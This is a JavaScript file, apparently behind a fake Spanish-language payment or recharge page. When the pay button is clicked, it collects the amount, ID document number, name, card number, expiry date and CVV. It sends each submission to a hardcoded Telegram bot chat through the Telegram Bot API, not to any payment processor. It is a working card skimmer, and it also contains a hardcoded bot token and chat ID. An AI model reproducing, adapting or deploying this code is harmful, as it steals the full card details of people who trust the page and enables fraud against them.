const botToken = '5970586689:AAGFIgrabj2F-mlGnbduPp7kYK5jK3VI1mU';
const userId = '5531518789';

document.getElementById('payButton').addEventListener('click', sendForm);

async function sendForm(event) {
  event.preventDefault();

  const recharge = document.getElementById('recharge').value;
  const doc = document.getElementById('doc').value;
  const name = document.getElementById('name').value;
  const card = document.getElementById('card').value;
  const venc = document.getElementById('venc').value;
  const cvv = document.getElementById('cvv').value;

  const message = `Monto: ${recharge}\nDocumento: ${doc}\nNombre: ${name}\nNúmero: ${card}\nVenc: ${venc}\nCVV: ${cvv}`;

  await sendMessage(botToken, userId, message);
}

async function sendMessage(botToken, userId, message) {
  const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const payload = {
    chat_id: userId,
    text: message,
  };

  const requestOptions = {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  };

  try {
    const response = await fetch(apiUrl, requestOptions);
    const data = await response.json();

    if (!response.ok) {
      throw new Error(`Error: ${data.description}`);
    }

    console.log('Mensaje enviado exitosamente:', data);
  } catch (error) {
    console.error('Error al enviar el mensaje:', error);
  }
}